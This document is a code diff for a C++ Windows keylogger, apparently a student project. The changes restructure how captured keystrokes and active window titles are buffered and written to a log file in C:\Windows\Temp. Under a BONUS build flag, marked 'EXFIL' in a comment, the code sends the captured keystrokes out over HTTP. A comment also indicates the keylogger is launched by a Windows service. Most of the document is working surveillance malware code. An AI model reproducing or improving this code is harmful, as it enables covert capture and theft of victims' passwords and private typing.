@@ -27,14 +27,14 @@
 // ============================================================================
 constexpr size_t MAX_BUFFER_CHARS = 5000;
 constexpr UINT FLUSH_TIMER_ID = 1;
-constexpr UINT FLUSH_TIMER_INTERVAL_MS = 60000;
+constexpr UINT FLUSH_TIMER_INTERVAL_MS = 30000;
 // ============================================================================
 // GLOBAL STATE
 // ============================================================================
 struct KeyloggerState
 {
     std::wstring currentProcessName;
-    std::wstring keystrokeBuffer;
+    std::vector<std::wstring> keystrokeBuffer;
     SYSTEMTIME bufferStartTime;
     size_t currentBufferSize = 0;
 
@@ -49,6 +49,7 @@ struct KeyloggerState
 };
 
 static KeyloggerState g_state;
+static const std::wstring LOG_PATH = L"C:\\Windows\\Temp\\winkey.log";
 
 // ============================================================================
 // UTILITY FUNCTIONS
@@ -88,23 +89,40 @@ void sendRequest(const std::wstring &message)
 }
 #endif
 
-void LogEvent(const std::wstring &message)
+FILE *OpenLogFile()
 {
-    std::wstring logPath = L"C:\\Windows\\Temp\\winkey.log";
+    FILE *f = nullptr;
+    errno_t err = _wfopen_s(&f, LOG_PATH.c_str(), L"a+");
 
-    std::wofstream file(logPath, std::ios::app);
-    if (!file)
+    if (err != 0 || f == nullptr)
     {
-        std::wstring buf =
-            L"Failed to open log file: " + logPath +
-            L", GetLastError=" + std::to_wstring(GetLastError());
-
-        OutputDebugStringW(buf.c_str());
-        return;
+        std::wstringstream ss;
+        ss << L"FAILED to open log file! errno=" << err
+           << L", GetLastError=" << GetLastError();
+        OutputDebugStringW(ss.str().c_str());
+        return nullptr;
     }
 
-    file << message << L'\n';
+    return f;
 }
+
+// void LogEvent(const std::wstring &message)
+// {
+//     std::wstring logPath = L"C:\\Windows\\Temp\\winkey.log";
+
+//     std::wofstream file(logPath, std::ios::app);
+//     if (!file)
+//     {
+//         std::wstring buf =
+//             L"Failed to open log file: " + logPath +
+//             L", GetLastError=" + std::to_wstring(GetLastError());
+
+//         OutputDebugStringW(buf.c_str());
+//         return;
+//     }
+
+//     file << message << L'\n';
+// }
 
 std::wstring FormatTimestamp(const SYSTEMTIME &st)
 {
@@ -179,17 +197,54 @@ void FlushBuffer(void)
 {
     // OutputDebugStringW(L">>> FlushBuffer() called");
 
-    if (g_state.keystrokeBuffer.empty())
+    if (g_state.keystrokeBuffer.empty()) // here empty only works if it is a vector
     {
         OutputDebugStringW(L"    Buffer is empty, nothing to flush");
         return;
     }
 
-    std::wstring timestamp = FormatTimestamp(g_state.bufferStartTime);
+    FILE *logFile = OpenLogFile();
+    if (!logFile)
+    {
+        OutputDebugStringW(L"Cannot flush: failed to open log file");
+        return;
+    }
 
-    LogEvent(timestamp + L" - " + g_state.currentProcessName + L"\n" + g_state.keystrokeBuffer + L"\n");
+    // Format: [timestamp] ProcessName :\n key1key2key3...
+    std::wstring timestamp = FormatTimestamp(g_state.bufferStartTime);
+    fwprintf(logFile, L"%s - %s :\n",
+             timestamp.c_str(),
+             g_state.currentProcessName.c_str());
+
+    // Write evrey keystroke from buffer
+    for (const auto &key : g_state.keystrokeBuffer)
+    {
+        fwprintf(logFile, L"%s", key.c_str());
+    }
+    fwprintf(logFile, L"\n");
+    fflush(logFile); // Force instant writing
+    fclose(logFile);
+    OutputDebugStringW(L"Buffer flushed to file successfully");
+
 #ifdef BONUS
-    sendRequest(g_state.currentProcessName + L" : " + g_state.keystrokeBuffer);
+    // EXFIL
+    try
+    {
+        // Build message from vector
+        std::wstringstream contentStream;
+        for (const auto &key : g_state.keystrokeBuffer)
+        {
+            contentStream << key;
+        }
+        std::wstring keystrokesContent = contentStream.str();
+
+        sendRequest(g_state.currentProcessName + L" : " + keystrokesContent);
+    }
+    catch (...)
+    {
+        OutputDebugStringW(L"WARNING: HTTP exfiltration failed");
+        // We still continue, local file is a priority
+    }
 #endif
     OutputDebugStringW(L"Buffer flushed successfully to file");
 
@@ -210,7 +265,6 @@ std::wstring GetActiveProcessName()
 
     wchar_t windowTitle[1024] = {0};
     GetWindowText(hwnd, windowTitle, _countof(windowTitle));
-    // CloseHandle(hwnd);
     return (std::wstring(windowTitle));
 }
 
@@ -239,7 +293,7 @@ void HandleProcessChange(const std::wstring &newProcessName)
 // ============================================================================
 void AddKeystrokeToBuffer(const std::wstring &key)
 {
-    g_state.keystrokeBuffer.append(key);
+    g_state.keystrokeBuffer.push_back(key);
     g_state.currentBufferSize += key.length();
 
     if (g_state.currentBufferSize >= MAX_BUFFER_CHARS)
@@ -433,7 +487,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
             break;
         }
 
-        // Si encore vide, on ignore
+        // If still empty, ignore
         if (key.empty())
         {
             return CallNextHookEx(NULL, nCode, wParam, lParam);
@@ -446,13 +500,13 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
         // Build modifier prefix (Ctrl / Alt / Shift / Win)
 
         if (g_state.ctrlDown && !isAltGr)
-            prefix += L"Ctrl";
+            prefix += L"[Ctrl]";
         if (g_state.altDown && !isAltGr)
-            prefix += L"Alt";
+            prefix += L"[Alt]";
         if (g_state.shiftDown)
-            prefix += L"Shift";
+            prefix += L"[Shift]";
         if (g_state.winDown)
-            prefix += L"Win";
+            prefix += L"[Win]";
 
         // Final displayed key
         std::wstring finalKey = prefix + key;
@@ -471,14 +525,6 @@ VOID CALLBACK TimerProc([[maybe_unused]] HWND hwnd,
     FlushBuffer();
 }
 
-// ============================================================================
-// CLEANUP ON EXIT
-// ============================================================================
-void Cleanup()
-{
-    FlushBuffer(); // Final flush before leaving
-}
-
 // The agent (launched as Session 1 by the service in Session 0)
 int main()
 {
@@ -487,11 +533,23 @@ int main()
     g_state.capsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
 
     // Instant writing test
-    SYSTEMTIME st;
-    GetLocalTime(&st);
-    std::wstring timestamp = FormatTimestamp(st);
-    LogEvent(timestamp + L" === Keylogger Started ===\n");
-    OutputDebugStringW(L"Startup message written to log");
+    // Test d'écriture au démarrage (CRITIQUE pour détecter les problèmes)
+    FILE *testFile = OpenLogFile();
+    if (testFile)
+    {
+        SYSTEMTIME st;
+        GetLocalTime(&st);
+        std::wstring timestamp = FormatTimestamp(st);
+        fwprintf(testFile, L"%s === Keylogger Started ===\n", timestamp.c_str());
+        fflush(testFile);
+        fclose(testFile);
+        OutputDebugStringW(L"Startup message written to log");
+    }
+    else
+    {
+        MessageBoxW(NULL, L"CANNOT OPEN LOG FILE AT STARTUP!", L"CRITICAL ERROR", MB_OK | MB_ICONERROR);
+        return 1;
+    }
 
     HHOOK hKeyboardHook;
     // Hook installation
@@ -523,6 +581,6 @@ int main()
         KillTimer(nullptr, timerId);
     }
     UnhookWindowsHookEx(hKeyboardHook);
-    Cleanup();
+    FlushBuffer(); // Final flush before leaving
     return 0;
 }
